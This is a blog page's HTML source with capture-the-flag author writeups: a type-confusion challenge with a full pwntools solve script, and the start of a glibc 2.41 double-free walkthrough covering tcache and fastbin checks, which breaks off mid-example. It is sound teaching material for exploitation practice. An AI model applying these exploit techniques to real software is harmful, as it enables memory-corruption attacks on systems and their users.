@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script>
+<script type="text/javascript">
+window.MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']]
+  },
+  chtml: {
+    scale: 1.10   /* Increase font size: 1.0 = default, 1.5 = 150% */
+  }
+};
+</script>
+  <title>SIT ctf author writeups</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="SIT ctf author writeups" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="recommended listening is 4 raws by esdeekid." />
+<meta property="og:description" content="recommended listening is 4 raws by esdeekid." />
+<link rel="canonical" href="http://localhost:4000/2025/12/22/sitctf.html" />
+<meta property="og:url" content="http://localhost:4000/2025/12/22/sitctf.html" />
+<meta property="og:site_name" content="wrenches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-12-22T05:40:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SIT ctf author writeups" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-12-22T05:40:00+08:00","datePublished":"2025-12-22T05:40:00+08:00","description":"recommended listening is 4 raws by esdeekid.","headline":"SIT ctf author writeups","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/12/22/sitctf.html"},"url":"http://localhost:4000/2025/12/22/sitctf.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wrenches" /><link rel="shortcut icon" type="image/x-icon" href="" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+
+</head>
+<body a="dark">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/"></a><article>
+  <p class="post-meta">
+    <time datetime="2025-12-22 05:40:00 +0800">2025-12-22 05:40:00 +0800</time>
+  </p>
+  
+  <h1>SIT ctf author writeups</h1>
+
+  <p>recommended listening is <a href="https://www.youtube.com/watch?v=gt_Oe2yGE4o">4 raws by esdeekid</a>.</p>
+
+<p><img src="https://i.imgur.com/MbHYOeA.png" alt="img" /></p>
+
+<p>thanks to the exco for letting me contribute! :)</p>
+
+<h2 id="pwngreen-yuri">pwn/green-yuri</h2>
+
+<p>this challenge is about type confusion.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"alright! finally. where's your album stored at? &gt; "</span><span class="p">);</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">"%llx"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">'\n'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
+  <span class="n">Album</span> <span class="o">*</span><span class="n">album</span> <span class="o">=</span> <span class="p">(</span><span class="n">Album</span> <span class="o">*</span><span class="p">)</span> <span class="n">addr</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span>
+    <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">album_name</span><span class="p">,</span> <span class="s">"me to her"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+    <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">artist_name</span><span class="p">,</span> <span class="s">"mitsuki koga"</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+    <span class="n">album</span><span class="o">-&gt;</span><span class="n">song_count</span><span class="o">==</span><span class="mi">10</span> <span class="o">&amp;&amp;</span>
+    <span class="n">album</span><span class="o">-&gt;</span><span class="n">completed</span>
+  <span class="p">)</span> <span class="n">win</span><span class="p">();</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"hmmm.. seems like the album isn't quite finished yet..."</span><span class="p">);</span>
+  <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>the win condition for this challenge is passing in a valid <code class="language-plaintext highlighter-rouge">Album</code> struct with the correct fields set. we’re allowed to pass a pointer to our struct, the program casts it to an <code class="language-plaintext highlighter-rouge">Album</code> pointer, and checks if all of the fields are correctly set.</p>
+
+<p>however, we do not have a way to actually create an <code class="language-plaintext highlighter-rouge">Album</code> struct. what we do have, however, is a way to add to <code class="language-plaintext highlighter-rouge">paychecks</code>, which is an array of doubles.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"how much money did you make today? &gt; "</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%lf"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">paychecks</span><span class="p">[</span><span class="n">days</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">())</span> <span class="o">!=</span> <span class="sc">'\n'</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"you made %lf dollars today!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">paychecks</span><span class="p">[</span><span class="n">days</span><span class="p">]);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="nf">puts</span><span class="p">(</span><span class="s">"invalid input..."</span><span class="p">);</span>
+  <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>the program is compiled w/ no PIE (position independent executable) and the <code class="language-plaintext highlighter-rouge">paychecks</code> array is defined as a global variable outside of the scope of the <code class="language-plaintext highlighter-rouge">main()</code> function. this means that the address of <code class="language-plaintext highlighter-rouge">paychecks</code> is always the same.</p>
+
+<p>first, we must understand what type confusion actually is. type confusion is when a program treats a variable with type A as if it were a variable with type B. it is not immediately clear why this leads to logic bugs, but consider the following program:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">secret_value</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">other_secret_value</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Secret</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">not_secret_value</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Not_Secret</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">print_value</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">Secret</span> <span class="o">*</span><span class="n">secret</span> <span class="o">=</span> <span class="p">(</span><span class="n">Secret</span> <span class="o">*</span><span class="p">)</span> <span class="n">val</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%d, %d"</span><span class="p">,</span> 
+         <span class="n">secret</span><span class="o">-&gt;</span><span class="n">secret_value</span><span class="p">,</span>
+         <span class="n">secret</span><span class="o">-&gt;</span><span class="n">other_secret_value</span>
+         <span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>if we ever get to call <code class="language-plaintext highlighter-rouge">print_value()</code> on an object w/ type <code class="language-plaintext highlighter-rouge">Not_Secret</code>, that second memory access (<code class="language-plaintext highlighter-rouge">secret-&gt;other_secret_value</code>) is going to end up accessing an out-of-bounds area not defined within our <code class="language-plaintext highlighter-rouge">Not_Secret</code> value.</p>
+
+<ul>
+  <li>typically these kinds of bugs are a lot more common in v8 / browser exploitation, the example presented in this challenge is a little contrived. but really i just thought to myself - huh what’s the most green-yuri coded pwn concept, and i ended up w/ type confusion.</li>
+</ul>
+
+<p>anyways back to the challenge. let’s hop into GDB and present an example as to what might happen if we cast our <code class="language-plaintext highlighter-rouge">paychecks</code> array as an <code class="language-plaintext highlighter-rouge">Album</code> struct.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">paychecks</span>
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="p">[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">100</span><span class="p">,</span>
+  <span class="p">[</span><span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">900</span><span class="p">,</span>
+  <span class="p">[</span><span class="mh">0x2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">300</span><span class="p">,</span>
+  <span class="p">[</span><span class="mh">0x3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">125</span> <span class="n">times</span><span class="o">&gt;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>here is the result of <code class="language-plaintext highlighter-rouge">p paychecks</code> after i put in some sample values (note that because i compiled this program w/ debug symbols, gef knows that the <code class="language-plaintext highlighter-rouge">paychecks</code> variable is an array of doubles, and prints it accordingly). we can also see the underlying bytewise representation of <code class="language-plaintext highlighter-rouge">paychecks</code>, by doing <code class="language-plaintext highlighter-rouge">x/4g</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">g</span> <span class="o">&amp;</span><span class="n">paychecks</span>
+<span class="mh">0x404080</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">&gt;:</span>	        <span class="mh">0x4059000000000000</span>	<span class="mh">0x408c200000000000</span>
+<span class="mh">0x404090</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="mh">0x4072c00000000000</span>	<span class="mh">0x0000000000000000</span>
+</code></pre></div></div>
+
+<p>we can verify that <code class="language-plaintext highlighter-rouge">0x4059000000000000</code> is the correct 64-bit hexadecimal representation of the integer <code class="language-plaintext highlighter-rouge">100</code> when cast into a double, as seen below.</p>
+
+<p><img src="https://i.imgur.com/FFtFs7g.png" alt="float" /></p>
+
+<p>now, let’s see what will happen when we cast <code class="language-plaintext highlighter-rouge">paychecks</code> to an <code class="language-plaintext highlighter-rouge">Album</code> struct.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">set</span> <span class="err">$</span><span class="n">album</span> <span class="o">=</span> <span class="p">(</span><span class="n">Album</span><span class="o">*</span><span class="p">)</span><span class="n">paychecks</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="err">$</span><span class="n">album</span>
+<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="p">(</span><span class="n">Album</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x404080</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">&gt;</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">ptype</span> <span class="err">$</span><span class="n">album</span>
+<span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">album_name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">artist_name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="kt">short</span> <span class="n">song_count</span><span class="p">;</span>
+    <span class="kt">_Bool</span> <span class="n">completed</span><span class="p">;</span>
+<span class="p">}</span> <span class="o">*</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="err">$</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">album_name</span>
+<span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000\000\000\000</span><span class="s">Y@</span><span class="se">\000\000\000\000\000</span><span class="s"> </span><span class="se">\214</span><span class="s">@"</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="err">$</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">artist_name</span>
+<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="s">"</span><span class="se">\000\000\000\000\000\300</span><span class="s">r@</span><span class="se">\000\000\000\000\000\000\000</span><span class="s">"</span>
+</code></pre></div></div>
+
+<p>we can see that the program still attempts to parse it as a valid <code class="language-plaintext highlighter-rouge">Album</code> struct by just reading the members of the struct as if they were the correct type (i.e., it tries to read the first float as a sixteen-long character array), so on and so forth.</p>
+
+<p>our goal is to figure out how to forge this struct by figuring out the correct doubles to pass in to the program.</p>
+
+<p>we can just do this dynamically w/ gdb as well. we’ll set our struct with the correct values, as shown below.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">set</span> <span class="err">$</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">album_name</span> <span class="o">=</span> <span class="s">"me to her"</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">set</span> <span class="err">$</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">artist_name</span> <span class="o">=</span> <span class="s">"mitsuki koga"</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">set</span> <span class="err">$</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">song_count</span> <span class="o">=</span> <span class="mi">10</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">set</span> <span class="err">$</span><span class="n">album</span><span class="o">-&gt;</span><span class="n">completed</span> <span class="o">=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p>then, let’s check the values at <code class="language-plaintext highlighter-rouge">paychecks</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">g</span> <span class="o">&amp;</span><span class="n">paychecks</span>
+<span class="mh">0x404080</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">&gt;:</span>	        <span class="mh">0x6568206f7420656d</span>	<span class="mh">0x0000000000000072</span>
+<span class="mh">0x404090</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="mh">0x20696b757374696d</span>	<span class="mh">0x0000000061676f6b</span>
+<span class="mh">0x4040a0</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="mh">0x000000000001000a</span>	<span class="mh">0x0000000000000000</span>
+<span class="mh">0x4040b0</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</code></pre></div></div>
+
+<p>and finally, let’s see what they would look like as doubles.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">6l</span><span class="n">f</span> <span class="o">&amp;</span><span class="n">paychecks</span>
+<span class="mh">0x404080</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">&gt;:</span>	        <span class="mf">3.1285662487989957e+180</span>	<span class="mf">5.6323483625902106e-322</span>
+<span class="mh">0x404090</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="mf">1.5167139053769265e-152</span>	<span class="mf">8.0738660577993429e-315</span>
+<span class="mh">0x4040a0</span> <span class="o">&lt;</span><span class="n">paychecks</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="mf">3.2384026822310346e-319</span>	<span class="mi">0</span>
+</code></pre></div></div>
+
+<p>so, if we just pass in these floats, and then get the address to paychecks (which is deterministic at every single run, due to PIE), we can win.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># it's just type confusion
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">paychecks_addr</span> <span class="o">=</span> <span class="mh">0x404080</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'green-yuri'</span><span class="p">)</span>
+
+<span class="n">doubles</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s">'3.1285662487989957e+180'</span><span class="p">,</span>
+    <span class="s">'5.6323483625902106e-322'</span><span class="p">,</span>
+    <span class="s">'1.5167139053769197e-152'</span><span class="p">,</span>
+    <span class="s">'8.0738658996983363e-315'</span><span class="p">,</span>
+    <span class="s">'3.2384026822310346e-319'</span><span class="p">,</span>
+    <span class="s">'6.6387106766042457e-319'</span><span class="p">,</span>
+    <span class="s">'0'</span><span class="p">,</span>
+    <span class="s">'0'</span>
+<span class="p">]</span>
+
+<span class="c1"># can ownself derive from manually gdbing
+</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">doubles</span><span class="p">:</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'0x404080'</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+</code></pre></div></div>
+
+<h3 id="pwnplushie-warehouse">pwn/plushie-warehouse</h3>
+
+<p>this challenge is about exploiting a double-free in libc 2.41. before we get started, some background: i sent this challenge to my friend <a href="https://fern89.github.io/2025/09/20/doublefree/">fern</a>, who decided to write up the technique we use in greater detail here! you can read their writeup, it is very good.</p>
+
+<p>the double-free is present in this section of code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">sort_shipments</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">orders_idx</span> <span class="o">&gt;=</span> <span class="n">WAREHOUSE_SIZE</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"the list of orders is already full!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">sell_list</span><span class="p">[</span><span class="n">orders_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
+	<span class="n">orders_idx</span><span class="o">++</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"successfully added %d to the orders list."</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+	<span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">ship_orders</span><span class="p">()</span> <span class="p">{</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"shipping out %d orders...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">orders_idx</span><span class="p">);</span>
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">orders_idx</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">sell_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0xff</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">Plushie</span> <span class="n">p</span> <span class="o">=</span> <span class="n">plushies</span><span class="p">[</span><span class="n">sell_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]];</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+				<span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+	<span class="c1">// then null out the structs</span>
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">orders_idx</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">sell_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0xff</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">plushies</span><span class="p">[</span><span class="n">sell_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]],</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">plushies</span><span class="p">[</span><span class="n">sell_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]]));</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="n">orders_idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="n">reset_sell_list</span><span class="p">();</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>we are given two options: add chunks to an array to be freed, then oneshot free them all. the key observation here is that we can add the same chunk <em>twice</em> to the array. if we add the same chunk twice, then after we do our oneshot free, it will free the same chunk twice accordingly. this is our double-free. how do we exploit it, especially on libc 2.41? libc 2.41 brings about a host of difficulties when it comes to this challenge, here are a list of them:</p>
+
+<ol>
+  <li>double free protection in tcache AND fastbin.</li>
+  <li>pointer mangling in tcache.</li>
+  <li>fastbin malloc checks.</li>
+</ol>
+
+<p>how do we defeat each check?</p>
+
+<hr />
+
+<p><strong>1a.</strong> double free protection in tcache. here is the relevant source code from <a href="https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L3225">elixir</a>.</p>
+
+<ul>
+  <li>in general i don’t expect people to go so in-depth and read elixir directly, but i think it’s good practice.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noinline</span><span class="p">))</span> <span class="kt">void</span>
+<span class="n">tcache_double_free_verify</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_tcache_double_free</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
+       <span class="n">tmp</span><span class="p">;</span>
+       <span class="n">tmp</span> <span class="o">=</span> <span class="n">REVEAL_PTR</span> <span class="p">(</span><span class="n">tmp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">),</span> <span class="o">++</span><span class="n">cnt</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">cnt</span> <span class="o">&gt;=</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
+	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): too many chunks detected in tcache"</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="o">!</span><span class="n">aligned_OK</span> <span class="p">(</span><span class="n">tmp</span><span class="p">)))</span>
+	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): unaligned chunk detected in tcache 2"</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">e</span><span class="p">)</span>
+	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): double free detected in tcache 2"</span><span class="p">);</span>
+      <span class="cm">/* If we get here, it was a coincidence.  We've wasted a
+	 few cycles, but don't abort.  */</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>problem:</strong> whenever we are about to free a chunk <em>t</em> into tcache, we check each entry and make sure there is no duplicate. if there is a duplicate, we error out.</p>
+
+<p><strong>solution:</strong> this is unavoidable. we basically just have to not perform double frees directly into tcache.</p>
+
+<hr />
+
+<p><strong>1b.</strong> double free protection in fastbins.</p>
+
+<p><a href="https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L4623">relevant source</a></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
+  <span class="p">{</span>
+<span class="cm">/* Check that the top of the bin is not the record we are going to
+  add (i.e., double free).  */</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"double free or corruption (fasttop)"</span><span class="p">);</span>
+<span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">PROTECT_PTR</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">old</span><span class="p">);</span>
+<span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>problem:</strong> whenever we are about to free a chunk <em>t</em> into fastbin, we check if the top of fastbin points to that same chunk <em>t</em>. if so, we error out.</p>
+
+<p><strong>solution:</strong> we can just free another sacrificial chunk before doing our double free. in essence, we free chunk <em>t</em>, then chunk <em>t1</em>, then chunk <em>t</em> again.</p>
+
+<hr />
+
+<p><strong>2.</strong> pointer mangling in tcache, <a href="https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L320">elixir source</a></p>
+
+<p>any person who’s done tcache poisoning should be familiar with this.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Safe-Linking:
+   Use randomness from ASLR (mmap_base) to protect single-linked lists
+   of Fast-Bins and TCache.  That is, mask the "next" pointers of the
+   lists' chunks, and also perform allocation alignment checks on them.
+   This mechanism reduces the risk of pointer hijacking, as was done with
+   Safe-Unlinking in the double-linked lists of Small-Bins.
+   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
+   larger pages provide less entropy, although the pointer mangling
+   still works.  */</span>
+<span class="cp">#define PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
+</span></code></pre></div></div>
+
+<p><strong>problem:</strong> chunks in tcache point to the next chunk in tcache. however, their pointers are mangled with the value <code class="language-plaintext highlighter-rouge">(heap_base &gt;&gt; 12)</code>, so we will need to know where the heap is in memory.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">bins</span>
